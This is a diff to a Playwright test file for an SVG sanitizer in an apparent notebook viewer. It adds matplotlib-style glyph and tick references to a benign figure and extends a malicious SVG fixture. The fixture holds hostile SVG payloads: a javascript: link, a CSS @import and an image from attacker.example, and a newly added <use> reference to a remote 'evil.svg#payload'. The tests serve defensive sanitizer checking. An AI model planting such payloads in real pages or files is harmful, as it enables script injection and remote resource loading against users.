@@ -7,10 +7,19 @@ type WindowWithProbe = typeof window & {
   __knuthAttachReply?: Record<string, unknown>;
 };
 
+// Shaped like matplotlib output: text glyphs and tick marks are <use>
+// references into <defs>, not <text> elements.
 const FIGURE_SVG = `
-<svg xmlns="http://www.w3.org/2000/svg" width="240" height="120" viewBox="0 0 240 120">
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="240" height="120" viewBox="0 0 240 120">
+  <defs>
+    <path id="glyph-A" d="M0 0 L4 -10 L8 0 Z"/>
+    <path id="tick" d="M0 0 L0 3.5" stroke="#000"/>
+  </defs>
   <rect width="240" height="120" fill="#f7f4ed"/>
   <path d="M20 100 L80 55 L140 75 L220 20" fill="none" stroke="#336699" stroke-width="4"/>
+  <use xlink:href="#tick" x="20" y="100"/>
+  <use xlink:href="#glyph-A" x="18" y="115"/>
 </svg>`;
 const MALICIOUS_SVG = `
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
@@ -22,6 +31,7 @@ const MALICIOUS_SVG = `
   </foreignObject>
   <style>@import url(https://attacker.example/import.css);</style>
   <image href="https://attacker.example/pixel.png" width="10" height="10"/>
+  <use xlink:href="https://attacker.example/evil.svg#payload" x="0" y="0"/>
   <a xlink:href="javascript:window.__knuthSvgExecuted='link'">
     <rect width="20" height="20"/>
   </a>
@@ -148,6 +158,9 @@ test('boots against the kernel protocol and renders a normal figure', async ({ p
     return response.text();
   });
   expect(renderedSvg).toContain('stroke="#336699"');
+  // matplotlib's glyphs and ticks survive sanitizing.
+  expect(renderedSvg).toMatch(/<use[^>]*href="#tick"/);
+  expect(renderedSvg).toMatch(/<use[^>]*href="#glyph-A"/);
   await expect(page.locator('.viewer .figure svg')).toHaveCount(0);
 });
 
